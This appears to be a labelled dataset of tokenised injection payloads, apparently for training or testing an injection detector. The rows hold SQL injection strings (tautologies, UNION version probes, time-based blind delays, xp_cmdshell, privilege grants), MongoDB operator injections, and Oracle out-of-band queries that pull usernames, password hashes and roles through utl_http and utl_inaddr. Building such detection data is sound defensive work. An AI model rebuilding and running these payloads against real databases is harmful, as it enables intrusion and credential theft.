0,SMCLN MINUS MINUS,injection
1,SQUT SMCLN MINUS MINUS,injection
2,SQUT RPRN SMCLN MINUS MINUS,injection
3,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,injection
4,SQUT GRANT CONNECT TO NAME SMCLN GRANT resource TO NAME SMCLN MINUS MINUS,injection
5,SQUT OR INT EQ INT MINUS MINUS,injection
6,SQUT UNION LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,injection
7,SQUT UNION LPRN SELECT NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
8,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
9,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
10,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
11,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
0,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
1,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
2,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
3,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
4,SQUT SMCLN IF NOT LPRN SELECT SYSTEM_USER RPRN LT GT SQUT sa SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
5,SQUT SMCLN IF is_srvrolemember LPRN SQUT sysadmin SQUT RPRN GT INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
6,SQUT SMCLN IF NOT LPRN LPRN SELECT serverproperty LPRN SQUT isintegratedsecurityonly SQUT RPRN RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
7,SQUT SMCLN IF NOT LPRN LPRN SELECT serverproperty LPRN SQUT isintegratedsecurityonly SQUT RPRN RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
0,INT SQUT INT,injection
1,INT EXEC sp_ LPRN OR EXEC xp_ RPRN,injection
2,INT AND INT EQ INT,injection
3,INT SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tablenames RPRN SMCLN MINUS MINUS,injection
4,INT OR INT EQ INT,injection
5,INT SQUT OR SQUT INT SQUT EQ SQUT INT,injection
6,1or1 EQ INT,injection
7,INT SQUT OR SQUT INT SQUT EQ SQUT INT,injection
8,fake ATR ema SQUT OR SQUT il DOT nl SQUT EQ SQUT il DOT nl,injection
0,INT,injection
1,INT AND user_name LPRN RPRN EQ SQUT dbo SQUT,injection
2,BSLSH SQUT SMCLN DESC users SMCLN MINUS MINUS,injection
3,INT BSLSH SQUT INT,injection
4,INT SQUT AND non_existant_table EQ SQUT INT,injection
5,SQUT OR username IS NOT NULL OR username EQ SQUT,injection
6,INT AND ascii LPRN LOWER LPRN SUBSTRING LPRN LPRN SELECT top INT NAME FROM sysobjects WHERE xtype EQ SQUT u SQUT RPRN CMMA INT CMMA INT RPRN RPRN RPRN GT INT,injection
7,INT UNION ALL SELECT INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA NAME FROM sysobjects WHERE xtype EQ SQUT u SQUT MINUS MINUS,injection
8,INT uni SLSH STAR STAR SLSH ON SELECT ALL FROM WHERE,injection
9,,injection
0,TRUE CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
1,CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
2,DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
3,SQUT CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
4,INT CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
5,LCBR DLLR ne CLN INT RCBR,injection
6,SQUT CMMA DLLR OR CLN LSQBR LCBR RCBR CMMA LCBR SQUT A SQUT CLN SQUT A,injection
7,SQUT RCBR RSQBR CMMA DLLR COMMENT CLN SQUT successful mongodb injection SQUT,injection
8,DB DOT injection DOT INSERT LPRN LCBR success CLN INT RCBR RPRN SMCLN,injection
9,DB DOT injection DOT INSERT LPRN LCBR success CLN INT RCBR RPRN SMCLN RETURN INT SMCLN DB DOT stores DOT mapreduce LPRN FUNCTION LPRN RPRN LCBR LCBR emit LPRN INT CMMA INT,injection
10,BITOR BITOR INT EQ EQ INT,injection
11,SQUT BITAND BITAND this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
12,SQUT BITAND BITAND this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
13,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
14,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
15,LCBR DLLR gt CLN SQUT SQUT RCBR,injection
16,LSQBR DLLR ne RSQBR EQ INT,injection
17,SQUT SMCLN sleep LPRN INT RPRN SMCLN,injection
18,SQUT SMCLN sleep LPRN INT RPRN SMCLN SQUT,injection
19,SQUT SMCLN sleep LPRN INT RPRN SMCLN PLUS SQUT,injection
20,SQUT SMCLN it EQ NEW PRCNT 20date LPRN RPRN SMCLN DO LCBR pt EQ NEW PRCNT 20date LPRN RPRN SMCLN RCBR WHILE LPRN pt MINUS it LT INT RPRN SMCLN,injection
0,â€™ OR â€˜1â€™ EQ â€™1,injection
1,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
2,SQUT BITOR BITOR utl_http DOT request LPRN SQUT http CLN SLSH SLSH INT DOT INT DOT INT DOT INT SLSH SQUT RPRN BITOR BITOR SQUT,injection
3,SQUT BITOR BITOR myappadmin DOT adduser LPRN SQUT ADMIN SQUT CMMA SQUT newpass SQUT RPRN BITOR BITOR SQUT,injection
4,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT banner FROM v DLLR VERSION WHERE rownum EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
5,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT login_user FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
6,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT database_name FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
7,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT host_name FROM v DLLR INSTANCE RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
8,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT global_name FROM global_name RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
9,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN username RPRN RPRN FROM sys DOT all_users RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
10,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN PASSWORD RPRN RPRN FROM sys DOT USER DLLR RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
11,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN TABLE_NAME RPRN RPRN FROM sys DOT all_tables RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
12,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN COLUMN_NAME RPRN RPRN FROM sys DOT all_tab_columns RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
13,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN granted_role RPRN RPRN FROM dba_role_privs WHERE grantee EQ sys DOT login_user RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
14,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
15,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
16,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
17,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
18,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
19,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
20,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
21,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
22,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
23,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
24,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
25,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
26,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
27,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
28,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
29,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
30,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
31,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
32,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
33,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
34,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
35,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
36,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
37,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
38,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
39,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
40,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
41,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
42,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
43,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
44,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
45,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
46,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
47,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
48,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
